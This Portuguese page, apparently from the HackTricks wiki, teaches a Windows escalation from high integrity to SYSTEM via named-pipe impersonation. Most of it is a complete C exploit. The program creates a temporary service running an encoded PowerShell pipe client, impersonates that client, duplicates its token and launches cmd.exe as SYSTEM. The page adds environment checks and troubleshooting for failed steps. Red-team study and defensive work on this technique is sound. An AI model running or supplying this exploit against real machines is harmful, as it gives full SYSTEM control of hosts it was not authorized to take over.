# De High Integrity para SYSTEM com Name Pipes

{{#include ../../banners/hacktricks-training.md}}

Esta é a **variante administrator/SCM** de impersonation com named pipes: um processo elevado cria um serviço temporário cujo processo filho se conecta como `SYSTEM` e, em seguida, faz impersonation desse cliente. Se o contexto inicial não puder criar serviços, mas tiver `SeImpersonatePrivilege`, use uma coerção de serviço privilegiado; consulte [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) e [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md). A criação do serviço requer acesso ao SCM e acesso `SERVICE_START` ao novo serviço, enquanto `CreateProcessWithTokenW` requer `SeImpersonatePrivilege`.<sup>[[2]](#references)[[3]](#references)</sup>

Confirme rapidamente o contexto inicial esperado:
```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
**Fluxo do código:**

1. Crie o servidor de named pipe **antes** de iniciar o serviço. Ao aguardar, trate o retorno `FALSE` de `ConnectNamedPipe` com `ERROR_PIPE_CONNECTED` como sucesso: isso significa que o cliente venceu a disputa e se conectou entre `CreateNamedPipe` e `ConnectNamedPipe`.<sup>[[4]](#references)</sup>
2. Crie e inicie um serviço que se conectará ao pipe criado e escreverá algo. O código do serviço executará este código PS codificado: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Depois que o serviço se conectar e escrever, chame `ImpersonateNamedPipeClient`, abra o thread token resultante e faça sua duplicação como um token primário.<sup>[[1]](#references)</sup>
4. Use esse token primário para iniciar `cmd.exe`.<sup>[[2]](#references)</sup>

Essa rota pressupõe que o chamador possa criar/iniciar um serviço e possua os privilégios exigidos por `CreateProcessWithTokenW` (normalmente `SeImpersonatePrivilege`). Trata-se de uma técnica de high-integrity-to-SYSTEM, não de uma primitive disponível para um usuário arbitrário com poucos privilégios.<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> Se a criação/inicialização do serviço falhar, o exemplo não sinalizará a thread do pipe, que poderá aguardar indefinidamente. Adicione tratamento de erros e um timeout de pipe overlapped antes de usá-lo fora de um lab. Use também um nome aleatório para o pipe/serviço a fim de evitar colisões.

`ImpersonateNamedPipeClient` adota o contexto associado à **última mensagem lida**, portanto uma conexão, por si só, é insuficiente: faça o cliente privilegiado escrever, verifique se `ReadFile` retornou dados e somente então faça a impersonation. Duplique o token de impersonation da thread em um token `TokenPrimary` com `SecurityImpersonation`; um token primário é o que a API de criação de processos consome.<sup>[[1]](#references)[[5]](#references)</sup>
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOW si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
}
if (bPipeConn) {
if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
return -6;
}

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
### Triagem de falhas

- `ConnectNamedPipe == FALSE` com `ERROR_PIPE_CONNECTED`: continue; o pipe já está conectado.<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient` falha com `ERROR_CANNOT_IMPERSONATE` (`1368`): confirme se o cliente SYSTEM realmente gravou dados e se `ReadFile` foi concluído. Verifique também o nível de impersonation solicitado pelo cliente; clientes nos níveis de identificação/anônimo não podem ser totalmente impersonated.<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW` falha com `ERROR_PRIVILEGE_NOT_HELD` (`1314`): o caller original não possui `SeImpersonatePrivilege`. Em um contexto de administrador com alta integridade, use a rota de cópia de token documentada em [SeImpersonate from High To System](seimpersonate-from-high-to-system.md) ou use `CreateProcessAsUserW` enquanto estiver impersonating SYSTEM, caso os privilégios necessários estejam presentes.<sup>[[2]](#references)</sup>
- `CreateServiceA` retorna `ERROR_SERVICE_EXISTS` (`1073`): exclua a entrada obsoleta `PiperSrv` ou torne `PIPESRV` aleatório; sempre exclua o serviço temporário após o trigger.<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
